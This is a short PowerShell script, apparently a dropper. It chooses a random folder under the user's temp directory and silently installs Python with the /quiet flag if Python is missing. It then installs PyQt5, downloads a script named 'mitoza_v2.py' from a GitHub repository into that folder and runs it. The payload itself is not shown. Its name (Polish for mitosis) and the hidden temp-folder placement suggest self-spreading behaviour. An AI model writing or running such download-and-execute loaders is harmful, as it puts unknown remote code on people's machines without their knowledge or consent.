$pth=(Get-ChildItem -Path $env:tmp -Directory -Name)
$dirq=($pth | Measure-Object -Line).Lines
if ($dirq -eq 0) {
    $direc = $env:tmp
}
elseif ($dirq -eq 1) {
    $direc = "$env:tmp\$pth"
}
else {
    $irec=($pth[(Get-Random -Minimum 0 -Maximum $dirq)])
    $direc = "$env:tmp\$irec"    
}

try {
    python -V
    
    if ((python -V) -like "Nie mo"){
        error
    }
}
catch {
    Invoke-WebRequest https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe -OutFile "$direc\python-3.12.8-amd64.exe"
    Start-Process "$direc\python-3.12.8-amd64.exe" "/quiet","PrependPath=1"
    $err = 1
    while ($err -eq 1) {
        try {
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
            python -m pip install pyqt5
            $err = 0
        }
        catch {
            Start-Sleep -Seconds 2
            $err=1
        }
    }
}
finally {
    if ([bool]((python -m pip list) -like "*PyQt5*") -eq "") {
        python -m pip install PyQt5
    }
}

Invoke-WebRequest https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py -outfile "$direc\mitoza.py"
python "$direc\mitoza.py"